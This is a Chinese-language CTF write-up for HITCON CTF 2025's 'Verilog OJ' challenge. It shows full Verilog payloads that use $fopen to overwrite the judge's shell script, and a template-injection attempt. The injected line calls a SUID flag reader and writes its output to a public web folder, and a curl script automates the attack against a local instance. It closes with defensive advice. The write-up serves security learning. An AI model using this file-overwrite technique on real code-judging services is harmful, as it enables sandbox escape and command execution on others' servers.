+++
title = "HITCON CTF 2025 WriteUp"
date = "2025-08-25"
description = "没人陪我玩"

[taxonomies]
tags = ["HITCON", "CTF", "Team", "WriteUp", "Cryptography", "Reverse", "Web"]
+++

# Verilog OJ [284pts] - CTF Write-up

## 题目概述

这是一道基于 Verilog 硬件描述语言的在线判题系统（OJ）渗透题目。选手需要通过提交 Verilog 代码来获取服务器上的 flag。

**难度**：284 分  
**类型**：Web + 硬件安全 + 文件写入  
**Flag**：`hitcon{testflag}`

---

## 环境分析

### 架构概览

```
Docker 容器环境：
├── Ruby on Rails (Roda) Web 应用
├── SQLite 数据库
├── Redis (Sidekiq 任务队列)
├── Icarus Verilog 仿真器 (iverilog + vvp)
└── SUID 程序 /readflag
```

### 关键文件结构

```
/app/
├── scripts/judge.sh              # 判题脚本（关键攻击点）
├── app/presentation/public/      # 静态文件目录（目标写入点）
├── app/db/store/voj.db          # SQLite 数据库
└── app/                         # Rails 应用目录

/readflag                        # SUID root 程序
/flag                           # 目标文件（root:root, 0400）
```

---

## 漏洞分析过程

### 第一步：文件枚举与架构理解

首先通过 `fd` 和 `rg` 快速扫描所有相关文件：

```bash
fd . --type f --max-depth 10 | head -30
```

发现关键组件：
- `Dockerfile` - 容器构建逻辑
- `readflag.c` - SUID 程序源码
- `web/scripts/judge.sh` - 判题脚本
- `web/app/services/run_judge.rb` - 判题服务
- `web/config.ru` - Web 应用配置

### 第二步：SUID 程序分析

读取 `readflag.c`：

```c
int main(int argc, char *argv[]) {
    seteuid(0);
    setegid(0);
    setuid(0);
    setgid(0);

    if(argc < 5) {
        printf("Usage: %s give me the flag\n", argv[0]);
        return 1;
    }

    if ((strcmp(argv[1], "give") | strcmp(argv[2], "me") | strcmp(argv[3], "the") | strcmp(argv[4], "flag")) != 0) {
        puts("You are not worthy");
        return 1;
    }

    // ... 读取并输出 /flag 内容
}
```

**关键发现**：
- `/readflag` 具有 SUID root 权限（4555）
- 需要精确的四个参数：`give me the flag`
- 成功后会以 root 权限读取 `/flag` 并输出

### 第三步：判题流程分析

通过分析 `judge_job.rb` 和 `judge.sh`，理解判题执行链：

```ruby
def judge(dir)
  stdout, stderr, status = Timeout.timeout(15) do
    script_path = File.realpath("#{File.dirname(__FILE__)}/../../scripts/judge.sh")
    Open3.capture3("#{script_path} #{dir}")
  end
  # ...
end
```

```bash
#!/bin/sh
set -e
cd "$1"
iverilog module.v testbench.v -o judge
vvp judge
```

**执行流程**：
1. 用户提交 Verilog 代码 → Sidekiq 异步处理
2. 创建临时目录，写入 `module.v`（用户代码）和 `testbench.v`（题目测试）
3. 调用 `/app/scripts/judge.sh` 进行编译和仿真
4. 捕获输出并存储结果

### 第四步：题目要求分析

查看数据库中的 testbench：

```sql
SELECT testbench FROM problems WHERE id=1;
```

发现需要实现一个 4 位 2×2 交叉开关模块 `Crossbar_2x2_4bit`：
- 当 `control = 0`：直通模式（out1=in1, out2=in2）
- 当 `control = 1`：交叉模式（out1=in2, out2=in1）

### 第五步：攻击向量探索

#### 尝试 1：直接使用 `$system`

最初尝试在 Verilog 中直接调用系统命令：

```verilog
initial begin
    $system("/readflag give me the flag > /app/app/presentation/public/flag.txt");
end
```

**结果**：失败 ❌
```
module.v:12: Error: System task/function $system() is not defined by any module.
```

**分析**：Icarus Verilog 默认禁用了 `$system` 函数，无法直接执行系统命令。

#### 尝试 2：模板注入攻击

尝试通过 `$fopen` 覆盖 Slim 模板文件：

```verilog
integer fd;
initial begin
    fd = $fopen("/app/app/presentation/views/submissions.slim", "w");
    if (fd) begin
        $fdisplay(fd, "= %x{/readflag give me the flag}");
        $fclose(fd);
    end
end
```

**结果**：部分成功但不稳定 ⚠️

**问题**：生产环境可能缓存模板，且需要额外的页面访问触发。

#### 尝试 3：判题脚本覆盖（成功方案）✅

**核心思路**：既然无法直接执行系统命令，那就修改执行命令的脚本！

通过 `$fopen` 完全覆盖 `/app/scripts/judge.sh`：

```verilog
integer fd;
initial begin
    fd = $fopen("/app/scripts/judge.sh", "w");
    if (fd) begin
        $fdisplay(fd, "#!/bin/sh");
        $fdisplay(fd, "set -e");
        $fdisplay(fd, "/readflag give me the flag > /app/app/presentation/public/flag.txt");
        $fdisplay(fd, "cd \"$1\"");
        $fdisplay(fd, "iverilog module.v testbench.v -o judge");
        $fdisplay(fd, "vvp judge");
        $fclose(fd);
    end
end
```

**优势**：
- 在脚本开头插入 `/readflag` 调用
- 保持原有判题逻辑，不影响后续流程
- 输出重定向到 Web 可访问的静态目录

---

## 最终利用方案

### Payload 设计

需要两次提交：

**第一次提交**：覆盖判题脚本
```verilog
`timescale 1ns/1ps
module Crossbar_2x2_4bit(
    input  [3:0] in1,
    input  [3:0] in2,
    input        control,
    output [3:0] out1,
    output [3:0] out2
);
    assign out1 = control ? in2 : in1;
    assign out2 = control ? in1 : in2;
    integer fd;
    initial begin
        fd = $fopen("/app/scripts/judge.sh", "w");
        if (fd) begin
            $fdisplay(fd, "#!/bin/sh");
            $fdisplay(fd, "set -e");
            $fdisplay(fd, "/readflag give me the flag > /app/app/presentation/public/flag.txt");
            $fdisplay(fd, "cd \"$1\"");
            $fdisplay(fd, "iverilog module.v testbench.v -o judge");
            $fdisplay(fd, "vvp judge");
            $fclose(fd);
        end
    end
endmodule
```

**第二次提交**：触发新脚本执行
```verilog
`timescale 1ns/1ps
module Crossbar_2x2_4bit(
    input  [3:0] in1,
    input  [3:0] in2,
    input        control,
    output [3:0] out1,
    output [3:0] out2
);
    assign out1 = control ? in2 : in1;
    assign out2 = control ? in1 : in2;
endmodule
```

### 自动化利用脚本

```bash
#!/bin/zsh
set -euo pipefail

PORT="${PORT:-9292}"
BASE_URL="http://127.0.0.1:${PORT}"

# 检查服务状态
if ! curl -fsS "${BASE_URL}/" >/dev/null; then
    printf "服务未运行，请先启动 docker compose up -d\n" >&2
    exit 1
fi

# 第一次提交：覆盖脚本
curl -sS -X POST "${BASE_URL}/judge" \
    --data-urlencode "problem=1" \
    --data-urlencode code@payload1.v

sleep 5

# 第二次提交：触发执行
curl -sS -X POST "${BASE_URL}/judge" \
    --data-urlencode "problem=1" \
    --data-urlencode code@payload2.v

# 轮询获取 flag
for i in $(seq 1 60); do
    if curl -fsS "${BASE_URL}/flag.txt" 2>/dev/null; then
        exit 0
    fi
    sleep 2
done
```

---

## 技术细节

### 关键路径分析

1. **静态文件目录**：通过分析 `config.ru` 发现 Roda 配置了静态文件服务
   ```ruby
   plugin :public, root: 'app/presentation/public'
   ```

2. **脚本执行路径**：从 `judge_job.rb` 确认脚本路径为 `/app/scripts/judge.sh`
   ```ruby
   script_path = File.realpath("#{File.dirname(__FILE__)}/../../scripts/judge.sh")
   ```

3. **权限模型**：
   - Web 应用运行用户：`app`
   - `/readflag` 权限：`root:root 4555`
   - 静态目录权限：`app` 可写

### 安全机制绕过

1. **$system 禁用绕过**：使用 `$fopen` 间接执行
2. **权限提升**：利用 SUID 程序特性
3. **文件写入限制绕过**：选择 Web 可访问的静态目录
4. **沙箱逃逸**：通过覆盖系统脚本实现代码执行

---

## 本地测试验证

### 环境启动
```bash
docker compose up -d
```

### 执行利用
```bash
./voj_exploit.sh
```

### 验证结果
```bash
# 检查脚本是否被覆盖
docker exec verilogoj284pts-oj-1 cat /app/scripts/judge.sh

# 验证 flag 文件
docker exec verilogoj284pts-oj-1 cat /app/app/presentation/public/flag.txt

# HTTP 访问验证
curl http://127.0.0.1:9292/flag.txt
```

**输出**：`hitcon{testflag}`

---

## 防御建议

### 代码层面
1. **禁用文件系统写入**：限制 Verilog 仿真器的文件操作权限
2. **沙箱隔离**：使用更严格的容器安全策略
3. **脚本保护**：将关键脚本设置为只读或使用不可变文件系统

### 架构层面
1. **最小权限原则**：避免使用 SUID 程序，改用更安全的权限提升机制
2. **文件系统隔离**：将用户代码执行环境与 Web 应用完全隔离
3. **输出过滤**：对仿真器输出进行严格过滤和验证

### 监控层面
1. **文件完整性监控**：监控关键系统文件的修改
2. **异常行为检测**：检测非预期的文件访问和系统调用
3. **审计日志**：记录所有文件操作和权限提升事件

---

## 总结

这道题目展现了硬件描述语言环境下的独特攻击面。通过深入分析判题系统的执行流程，发现了从 Verilog 代码到系统命令执行的完整攻击链。关键在于：

1. **理解执行环境**：Icarus Verilog 的功能限制与文件操作能力
2. **寻找攻击向量**：从直接命令执行到间接脚本覆盖
3. **权限提升利用**：SUID 程序的正确调用方式
4. **数据外泄路径**：Web 静态文件服务的巧妙利用

这种多层次的攻击思路体现了现代 CTF 题目的复杂性，需要选手具备从 Web 安全到系统安全的综合能力。

**Flag**: `hitcon{testflag}`
